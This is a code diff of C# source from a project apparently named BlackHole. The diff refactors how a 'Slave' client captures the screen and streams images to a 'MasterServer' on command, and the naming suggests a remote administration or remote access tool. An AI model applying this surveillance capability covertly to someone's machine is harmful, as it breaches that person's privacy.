@@ -1,5 +1,6 @@
 ﻿using BlackHole.Common;
 using BlackHole.Common.Network.Protocol;
+using BlackHole.Slave.Helper;
 using NetMQ;
 using System;
 using System.Collections.Concurrent;
@@ -22,8 +23,7 @@ namespace BlackHole.Slave
         public const int DISCONNECTION_TIMEOUT = 8000;
         public const int SEND_INTERVAL = 10;
         public const int RECEIVE_INTERVAL = 10;
-
-        private bool m_capturing = false;
+        
         private CancellationTokenSource m_screenCaptureTokenSource;
         private Stopwatch m_receiveTimer;
         private NetMQContext m_netContext;
@@ -34,11 +34,16 @@ namespace BlackHole.Slave
         private bool m_connected = false;
         private long m_lastReceived = -1;
 
+        private bool IsCapturingScreen => !m_screenCaptureTokenSource.IsCancellationRequested;
+
         /// <summary>
         /// 
         /// </summary>
         public MasterServer(NetMQContext context, string serverAddress)
         {
+            m_screenCaptureTokenSource = new CancellationTokenSource();
+            m_screenCaptureTokenSource.Cancel();
+
             m_serverAddress = serverAddress;
             m_netContext = context;
             m_client = m_netContext.CreateDealerSocket();
@@ -81,7 +86,7 @@ namespace BlackHole.Slave
                 i--;
             }
 
-            if (m_receiveTimer.ElapsedMilliseconds - m_lastReceived > DISCONNECTION_TIMEOUT && m_connected)
+            if (m_connected && ((m_receiveTimer.ElapsedMilliseconds - m_lastReceived) > DISCONNECTION_TIMEOUT))
             {
                 SetDisconnected();
                 Send(new GreetTheMasterMessage()
@@ -93,14 +98,11 @@ namespace BlackHole.Slave
                 });
             }
         }
-
+                
         /// <summary>
         /// 
         /// </summary>
-        private void SetConnected()
-        {
-            m_connected = true;
-        }
+        private void SetConnected() => m_connected = true;
 
         /// <summary>
         /// 
@@ -108,11 +110,7 @@ namespace BlackHole.Slave
         private void SetDisconnected()
         {
             m_connected = false;
-            if (m_capturing)
-            {
-                m_capturing = false;
-                m_screenCaptureTokenSource.Cancel();
-            }
+            CancelScreenCapture();
             ClearSendQueue();
         }
 
@@ -393,52 +391,53 @@ namespace BlackHole.Slave
         /// <param name="message"></param>
         private void StartScreenCapture(StartScreenCaptureMessage message)
         {
-            if (m_capturing)
-                return; // dont start multiple tasks
+            if (IsCapturingScreen)
+                return;
             m_screenCaptureTokenSource = new CancellationTokenSource();
 
             SendStatus(message.WindowId, "Screen capture", "Started capturing...");
-            Task.Factory.StartNew(() => SendCapture(message), m_screenCaptureTokenSource.Token);
-        }
 
-        /// <summary>
-        /// 
-        /// </summary>
-        /// <param name="message"></param>
-        private async void SendCapture(StartScreenCaptureMessage message)
-        {
-            m_capturing = true;
-            try
+            // we dont assign it now so that we can use it in the lambda itself
+            Action sendCapture = null;
+            sendCapture = async () =>
             {
-                ExecuteComplexSendOperation(message.WindowId,
-                    "Screen capture",
-                    () => RemoteDesktopHelper.CaptureScreen(message.ScreenNumber, message.Quality));
+                try
+                {
+                    ExecuteComplexSendOperation(message.WindowId,
+                        "Screen capture",
+                        () => RemoteDesktopHelper.CaptureScreen(message.ScreenNumber, message.Quality));
 
-                m_screenCaptureTokenSource.Token.ThrowIfCancellationRequested();
+                    m_screenCaptureTokenSource.Token.ThrowIfCancellationRequested();
 
-                // capture rate FPS
-                await Task.Delay(TimeSpan.FromMilliseconds(1000 / message.Rate));
+                    // capture rate FPS
+                    await Task.Delay(TimeSpan.FromMilliseconds(1000 / message.Rate));
 
-                // continue
-                await Task.Factory.StartNew(() => SendCapture(message), m_screenCaptureTokenSource.Token);
-            }
-            catch(Exception e)
-            {
-                // cancelled
-                m_capturing = false;
-                SendStatus(message.WindowId, "Screen capture", "Stopped capturing...");
-            }
+                    // continue
+                    await Task.Factory.StartNew(sendCapture, m_screenCaptureTokenSource.Token);
+                }
+                catch (Exception e)
+                {
+                    // cancelled
+                    SendStatus(message.WindowId, "Screen capture", "Stopped capturing...");
+                }
+            };
+            Task.Factory.StartNew(sendCapture, m_screenCaptureTokenSource.Token);
         }
-
+        
         /// <summary>
         /// 
         /// </summary>
         /// <param name="message"></param>
         private void StopScreenCapture(StopScreenCaptureMessage message)
         {
-            m_screenCaptureTokenSource.Cancel();
+            CancelScreenCapture();
         }
 
+        /// <summary>
+        /// 
+        /// </summary>
+        private void CancelScreenCapture() => m_screenCaptureTokenSource.Cancel();
+        
         /// <summary>
         /// 
         /// </summary>
